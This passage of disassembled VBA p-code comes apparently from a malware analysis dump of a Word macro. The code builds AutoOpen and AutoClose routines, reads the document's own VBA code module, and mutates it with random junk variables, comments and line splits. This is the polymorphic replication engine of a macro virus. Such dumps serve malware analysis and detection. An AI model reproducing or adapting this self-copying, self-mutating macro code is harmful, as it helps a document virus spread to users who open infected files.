' 	Ld tg 
' 	EndForVariable 
' 	NextVar 
' Line #45:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Acd 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld NormT 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #46:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Acd 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #47:
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #48:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0000 
' 	St t 
' Line #49:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #50:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	Coerce (Int) 
' 	St t 
' Line #51:
' 	LineCont 0x0004 01 00 00 00
' 	Ld t 
' 	LitDI2 0x0032 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St g 
' 	EndIf 
' Line #52:
' 	LineCont 0x0004 01 00 00 00
' 	Ld t 
' 	LitDI2 0x0031 
' 	Gt 
' 	Ld t 
' 	LitDI2 0x0065 
' 	Lt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	St g 
' 	EndIf 
' Line #53:
' 	LineCont 0x0004 01 00 00 00
' 	Ld g 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #54:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	Coerce (Int) 
' 	St v 
' Line #55:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld vs 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld v 
' 	For 
' Line #56:
' 	Label beginNn 
' Line #57:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Rnd 
' 	LitDI2 0x00FA 
' 	Mul 
' 	Coerce (Int) 
' 	St z 
' Line #58:
' 	LineCont 0x0004 01 00 00 00
' 	Ld z 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo beginNn 
' 	EndIf 
' Line #59:
' 	LineCont 0x0004 01 00 00 00
' 	Ld z 
' 	LitDI2 0x0041 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo beginNn 
' 	EndIf 
' Line #60:
' 	LineCont 0x0004 01 00 00 00
' 	Ld z 
' 	LitDI2 0x0082 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo beginNn 
' 	EndIf 
' Line #61:
' 	LineCont 0x0004 01 00 00 00
' 	Ld va 
' 	Ld z 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St va 
' Line #62:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld vs 
' 	EndForVariable 
' 	NextVar 
' Line #63:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	Coerce (Int) 
' 	St v 
' Line #64:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld vss 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld v 
' 	For 
' Line #65:
' 	Label begin5 
' Line #66:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Rnd 
' 	LitDI2 0x00FA 
' 	Mul 
' 	Coerce (Int) 
' 	St z 
' Line #67:
' 	LineCont 0x0004 01 00 00 00
' 	Ld z 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo begin5 
' 	EndIf 
' Line #68:
' 	LineCont 0x0004 01 00 00 00
' 	Ld z 
' 	LitDI2 0x0022 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo begin5 
' 	EndIf 
' Line #69:
' 	LineCont 0x0004 01 00 00 00
' 	Ld z 
' 	LitDI2 0x0082 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo begin5 
' 	EndIf 
' Line #70:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Inn 
' 	Ld z 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Inn 
' Line #71:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld vss 
' 	EndForVariable 
' 	NextVar 
' Line #72:
' 	Ld FullCodeN 
' 	Ld va 
' 	Concat 
' 	LitStr 0x0001 "="
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Inn 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #73:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #74:
' 	LineCont 0x0004 01 00 00 00
' 	Ld g 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #75:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	Coerce (Int) 
' 	St v 
' Line #76:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld vsss 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld v 
' 	For 
' Line #77:
' 	Label begin2 
' Line #78:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Rnd 
' 	LitDI2 0x00FA 
' 	Mul 
' 	Coerce (Int) 
' 	St z 
' Line #79:
' 	LineCont 0x0004 01 00 00 00
' 	Ld z 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo begin2 
' 	EndIf 
' Line #80:
' 	LineCont 0x0004 01 00 00 00
' 	Ld z 
' 	LitDI2 0x0082 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo begin2 
' 	EndIf 
' Line #81:
' 	LineCont 0x0004 01 00 00 00
' 	Ld va 
' 	Ld z 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St va 
' Line #82:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld vsss 
' 	EndForVariable 
' 	NextVar 
' Line #83:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Rnd 
' 	LitDI2 0x00FA 
' 	Mul 
' 	Coerce (Int) 
' 	St z 
' Line #84:
' 	LitStr 0x0004 "Chr("
' 	Ld z 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	St Inn 
' Line #85:
' 	Ld FullCodeN 
' 	Ld va 
' 	Concat 
' 	LitStr 0x0001 "="
' 	Concat 
' 	Ld Inn 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #86:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #87:
' 	LineCont 0x0004 01 00 00 00
' 	Ld g 
' 	LitDI2 0x0003 
' 	Eq 
' 	IfBlock 
' Line #88:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	Coerce (Int) 
' 	St v 
' Line #89:
' 	LitStr 0x0001 "'"
' 	St va 
' Line #90:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld vssss 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld v 
' 	For 
' Line #91:
' 	Label begin3 
' Line #92:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Rnd 
' 	LitDI2 0x00FA 
' 	Mul 
' 	Coerce (Int) 
' 	St z 
' Line #93:
' 	LineCont 0x0004 01 00 00 00
' 	Ld z 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo begin3 
' 	EndIf 
' Line #94:
' 	LineCont 0x0004 01 00 00 00
' 	Ld z 
' 	LitDI2 0x0082 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo begin3 
' 	EndIf 
' Line #95:
' 	LineCont 0x0004 01 00 00 00
' 	Ld va 
' 	Ld z 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St va 
' Line #96:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld vssss 
' 	EndForVariable 
' 	NextVar 
' Line #97:
' 	LineCont 0x0004 01 00 00 00
' 	Ld FullCodeN 
' 	Ld va 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #98:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #99:
' 	LineCont 0x0004 01 00 00 00
' 	Ld g 
' 	LitDI2 0x0004 
' 	Eq 
' 	IfBlock 
' Line #100:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	Coerce (Int) 
' 	St v 
' Line #101:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld vsssss 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld v 
' 	For 
' Line #102:
' 	Label begin4 
' Line #103:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Rnd 
' 	LitDI2 0x00FA 
' 	Mul 
' 	Coerce (Int) 
' 	St z 
' Line #104:
' 	LineCont 0x0004 01 00 00 00
' 	Ld z 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo begin4 
' 	EndIf 
' Line #105:
' 	LineCont 0x0004 01 00 00 00
' 	Ld z 
' 	LitDI2 0x0082 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo begin4 
' 	EndIf 
' Line #106:
' 	LineCont 0x0004 01 00 00 00
' 	Ld va 
' 	Ld z 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St va 
' Line #107:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld vsssss 
' 	EndForVariable 
' 	NextVar 
' Line #108:
' 	Ld va 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	St va 
' Line #109:
' 	LineCont 0x0004 01 00 00 00
' 	Ld FullCodeN 
' 	Ld va 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #110:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #111:
' 	LineCont 0x0004 01 00 00 00
' 	Ld tg 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St aaaa 
' Line #112:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	St hh 
' Line #113:
' 	Do 
' Line #114:
' 	LineCont 0x0004 01 00 00 00
' 	Ld hh 
' 	Ld aaaa 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo nextterm 
' 	EndIf 
' Line #115:
' 	LineCont 0x0004 01 00 00 00
' 	Ld hh 
' 	LitDI2 0x0001 
' 	Add 
' 	St hh 
' Line #116:
' 	LineCont 0x0004 01 00 00 00
' 	Ld hh 
' 	LitDI2 0x0001 
' 	Ld tg 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #117:
' 	Ld a 
' 	LitDI2 0x0001 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	IfBlock 
' Line #118:
' 	LineCont 0x0004 01 00 00 00
' 	Ld FullCodeN 
' 	Ld a 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #119:
' 	LineCont 0x0004 01 00 00 00
' 	GoTo NextLineN 
' Line #120:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #121:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0000 
' 	St Spac 
' Line #122:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0000 
' 	St t 
' Line #123:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0000 
' 	St PosL 
' Line #124:
' 	Label BeginN 
' Line #125:
' 	LineCont 0x0004 01 00 00 00
' 	Ld a 
' 	FnLen 
' 	St l 
' Line #126:
' 	Do 
' Line #127:
' 	LineCont 0x0004 01 00 00 00
' 	Ld PosL 
' 	Ld l 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo NoCN 
' 	EndIf 
' Line #128:
' 	LineCont 0x0004 01 00 00 00
' 	Ld PosL 
' 	LitDI2 0x0001 
' 	Add 
' 	St PosL 
' Line #129:
' 	LineCont 0x0004 01 00 00 00
' 	Ld a 
' 	Ld PosL 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Eq 
' 	IfBlock 
' Line #130:
' 	LineCont 0x0004 01 00 00 00
' 	Ld FullCodeN 
' 	Ld a 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #131:
' 	LineCont 0x0004 01 00 00 00
' 	GoTo NextLineN 
' Line #132:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #133:
' 	Loop 
' Line #134:
' 	Label NoCN 
' Line #135:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0000 
' 	St PosL 
' Line #136:
' 	Ld a 
' 	LitDI2 0x0001 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0001 "_"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo UnsplitN 
' 	EndIf 
' Line #137:
' 	LineCont 0x0004 01 00 00 00
' 	GoTo SplitN 
' Line #138:
' 	Label UnsplitN 
' Line #139:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0000 
' 	St v 
' Line #140:
' 	LineCont 0x0004 01 00 00 00
' 	Ld a 
' 	St y 
' Line #141:
' 	Do 
' Line #142:
' 	Ld y 
' 	LitDI2 0x0001 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0001 "_"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo NoChN 
' 	EndIf 
' Line #143:
' 	LineCont 0x0004 01 00 00 00
' 	Ld y 
' 	FnLen 
' 	St l 
' Line #144:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0000 
' 	St PosL 
' Line #145:
' 	Do 
' Line #146:
' 	LineCont 0x0004 01 00 00 00
' 	Ld PosL 
' 	LitDI2 0x0001 
' 	Add 
' 	St PosL 
' Line #147:
' 	LineCont 0x0004 01 00 00 00
' 	Ld y 
' 	Ld PosL 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St s 
' Line #148:
' 	Ld s 
' 	LitStr 0x0001 "_"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo FoundN 
' 	EndIf 
' Line #149:
' 	Loop 
' Line #150:
' 	Label FoundN 
' Line #151:
' 	LineCont 0x0004 01 00 00 00
' 	Ld PosL 
' 	LitDI2 0x0001 
' 	Sub 
' 	St Spac 
' Line #152:
' 	LineCont 0x0004 01 00 00 00
' 	Ld y 
' 	Ld l 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	St y 
' Line #153:
' 	LineCont 0x0004 01 00 00 00
' 	Ld hh 
' 	LitDI2 0x0001 
' 	Add 
' 	St hh 
' Line #154:
' 	LineCont 0x0004 01 00 00 00
' 	Ld hh 
' 	LitDI2 0x0001 
' 	Ld tg 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #155:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	St v 
' Line #156:
' 	LineCont 0x0004 01 00 00 00
' 	Ld y 
' 	Ld a 
' 	Concat 
' 	St y 
' Line #157:
' 	Loop 
' Line #158:
' 	Label NoChN 
' Line #159:
' 	LineCont 0x0004 01 00 00 00
' 	Ld y 
' 	St a 
' Line #160:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0000 
' 	St c 
' Line #161:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0000 
' 	St PoslO 
' Line #162:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0000 
' 	St PosL 
' Line #163:
' 	LineCont 0x0004 01 00 00 00
' 	GoTo BeginN 
' Line #164:
' 	Label SplitN 
' Line #165:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0000 
' 	St PosL 
' Line #166:
' 	LineCont 0x0004 01 00 00 00
' 	Ld a 
' 	FnLen 
' 	St l 
' Line #167:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0000 
' 	St k 
' Line #168:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Spac 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #169:
' 	Do 
' Line #170:
' 	LineCont 0x0004 01 00 00 00
' 	Ld k 
' 	LitDI2 0x0001 
' 	Add 
' 	St k 
' Line #171:
' 	LineCont 0x0004 01 00 00 00
' 	Ld k 
' 	Ld l 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo NC 
' 	EndIf 
' Line #172:
' 	LineCont 0x0004 01 00 00 00
' 	Ld a 
' 	Ld k 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St s 
' Line #173:
' 	Ld s 
' 	LitStr 0x0001 " "
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld k 
' 	St g 
' 	EndIf 
' Line #174:
' 	Loop 
' Line #175:
' 	Label NC 
' Line #176:
' 	LineCont 0x0004 01 00 00 00
' 	Ld g 
' 	Ld Spac 
' 	Le 
' 	IfBlock 
' Line #177:
' 	LineCont 0x0004 01 00 00 00
' 	Ld FullCodeN 
' 	Ld a 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #178:
' 	LineCont 0x0004 01 00 00 00
' 	GoTo NextLineN 
' Line #179:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #180:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #181:
' 	Do 
' Line #182:
' 	LineCont 0x0004 01 00 00 00
' 	Ld PosL 
' 	Ld l 
' 	Gt 
' 	IfBlock 
' Line #183:
' 	LineCont 0x0004 01 00 00 00
' 	Ld FullCodeN 
' 	Ld a 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #184:
' 	LineCont 0x0004 01 00 00 00
' 	GoTo NextLineN 
' Line #185:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #186:
' 	LineCont 0x0004 01 00 00 00
' 	Ld PosL 
' 	LitDI2 0x0001 
' 	Add 
' 	St PosL 
' Line #187:
' 	LineCont 0x0004 01 00 00 00
' 	Ld a 
' 	Ld PosL 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St s 
' Line #188:
' 	LineCont 0x0004 01 00 00 00
' 	Ld s 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Eq 
' 	IfBlock 
' Line #189:
' 	LineCont 0x0004 01 00 00 00
' 	Ld FullCodeN 
' 	Ld a 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #190:
' 	LineCont 0x0004 01 00 00 00
' 	GoTo NextLineN 
' Line #191:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #192:
' 	Ld s 
' 	LitStr 0x0001 " "
' 	Eq 
' 	IfBlock 
' Line #193:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Spac 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #194:
' 	Ld a 
' 	Ld PosL 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0001 " "
' 	Concat 
' 	LitStr 0x0001 "_"
' 	Concat 
' 	St False 
' Line #195:
' 	LineCont 0x0004 01 00 00 00
' 	Ld a 
' 	Ld PosL 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld l 
' 	ArgsLd Mid$ 0x0003 
' 	St las 
' Line #196:
' 	LineCont 0x0004 01 00 00 00
' 	Ld FullCodeN 
' 	Ld False 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #197:
' 	LineCont 0x0004 01 00 00 00
' 	Ld FullCodeN 
' 	Ld las 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #198:
' 	LineCont 0x0004 01 00 00 00
' 	GoTo NextLineN 
' Line #199:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #200:
' 	LineCont 0x0004 01 00 00 00
' 	Ld PosL 
' 	Ld Spac 
' 	Le 
' 	IfBlock 
' Line #201:
' 	LineCont 0x0004 01 00 00 00
' 	Ld PosL 
' 	Ld PoslO 
' 	Sub 
' 	St wa 
' Line #202:
' 	LineCont 0x0004 01 00 00 00
' 	Ld PoslO 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #203:
' 	Ld a 
' 	Ld PoslO 
' 	Ld wa 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 " "
' 	Concat 
' 	LitStr 0x0001 "_"
' 	Concat 
' 	St Temp 
' Line #204:
' 	ElseBlock 
' Line #205:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Ld PosL 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 " "
' 	Concat 
' 	LitStr 0x0001 "_"
' 	Concat 
' 	St Temp 
' Line #206:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #207:
' 	LineCont 0x000C 01 00 00 00 02 00 00 00 03 00 00 00
' 	Ld FullCodeN 
' 	Ld Temp 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #208:
' 	LineCont 0x000C 01 00 00 00 02 00 00 00 03 00 00 00
' 	Ld PosL 
' 	LitDI2 0x0001 
' 	Add 
' 	St PoslO 
' Line #209:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	St c 
' Line #210:
' 	LineCont 0x0004 01 00 00 00
' 	GoTo NextCharN 
' Line #211:
' 	ElseBlock 
' Line #212:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	St c 
' Line #213:
' 	LineCont 0x0004 01 00 00 00
' 	Ld PosL 
' 	Ld PoslO 
' 	Paren 
' 	Sub 
' 	St wa 
' Line #214:
' 	Ld a 
' 	Ld PoslO 
' 	Ld wa 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 " "
' 	Concat 
' 	LitStr 0x0001 "_"
' 	Concat 
' 	St Temp 
' Line #215:
' 	LineCont 0x0004 01 00 00 00
' 	Ld a 
' 	Ld PosL 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld l 
' 	ArgsLd Mid$ 0x0003 
' 	St Temp2 
' Line #216:
' 	LineCont 0x0004 01 00 00 00
' 	Ld FullCodeN 
' 	Ld Temp 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Temp2 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #217:
' 	LineCont 0x0004 01 00 00 00
' 	Ld PosL 
' 	Ld Spac 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo NextLineN 
' 	EndIf 
' Line #218:
' 	LineCont 0x0004 01 00 00 00
' 	GoTo NextCharN 
' Line #219:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #220:
' 	Ld a 
' 	Ld PoslO 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld PosL 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 " "
' 	Concat 
' 	LitStr 0x0001 "_"
' 	Concat 
' 	St Temp 
' Line #221:
' 	LineCont 0x0004 01 00 00 00
' 	Ld FullCodeN 
' 	Ld Temp 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #222:
' 	LineCont 0x0004 01 00 00 00
' 	GoTo NextLineN 
' Line #223:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #224:
' 	Label NextCharN 
' Line #225:
' 	Loop 
' Line #226:
' 	LineCont 0x0004 01 00 00 00
' 	Ld FullCodeN 
' 	Ld y 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #227:
' 	LineCont 0x0004 01 00 00 00
' 	GoTo NextLineN 
' Line #228:
' 	Label NextLineN 
' Line #229:
' 	Loop 
' Line #230:
' 	Label nextterm 
' Line #231:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #232:
' 	LineCont 0x0004 01 00 00 00
' 	Ld NormT 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #233:
' 	LitStr 0x000E "Sub AutoOpen()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #234:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0000 
' 	St t 
' Line #235:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #236:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	Coerce (Int) 
' 	St t 
' Line #237:
' 	LineCont 0x0004 01 00 00 00
' 	Ld t 
' 	LitDI2 0x0032 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St g 
' 	EndIf 
' Line #238:
' 	LineCont 0x0004 01 00 00 00
' 	Ld t 
' 	LitDI2 0x0031 
' 	Gt 
' 	Ld t 
' 	LitDI2 0x0065 
' 	Lt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	St g 
' 	EndIf 
' Line #239:
' 	LineCont 0x0004 01 00 00 00
' 	Ld g 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #240:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	Coerce (Int) 
' 	St v 
' Line #241:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld vDs 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld v 
' 	For 
' Line #242:
' 	Label beginDD 
' Line #243:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Rnd 
' 	LitDI2 0x00FA 
' 	Mul 
' 	Coerce (Int) 
' 	St z 
' Line #244:
' 	LineCont 0x0004 01 00 00 00
' 	Ld z 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo beginDD 
' 	EndIf 
' Line #245:
' 	LineCont 0x0004 01 00 00 00
' 	Ld z 
' 	LitDI2 0x0041 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo beginDD 
' 	EndIf 
' Line #246:
' 	LineCont 0x0004 01 00 00 00
' 	Ld z 
' 	LitDI2 0x0082 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo beginDD 
' 	EndIf 
' Line #247:
' 	LineCont 0x0004 01 00 00 00
' 	Ld va 
' 	Ld z 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St va 
' Line #248:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld vDs 
' 	EndForVariable 
' 	NextVar 
' Line #249:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	Coerce (Int) 
' 	St v 
' Line #250:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld vDss 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld v 
' 	For 
' Line #251:
' 	Label beginD5 
' Line #252:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Rnd 
' 	LitDI2 0x00FA 
' 	Mul 
' 	Coerce (Int) 
' 	St z 
' Line #253:
' 	LineCont 0x0004 01 00 00 00
' 	Ld z 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo beginD5 
' 	EndIf 
' Line #254:
' 	LineCont 0x0004 01 00 00 00
' 	Ld z 
' 	LitDI2 0x0022 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo beginD5 
' 	EndIf 
' Line #255:
' 	LineCont 0x0004 01 00 00 00
' 	Ld z 
' 	LitDI2 0x0082 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo beginD5 
' 	EndIf 
' Line #256:
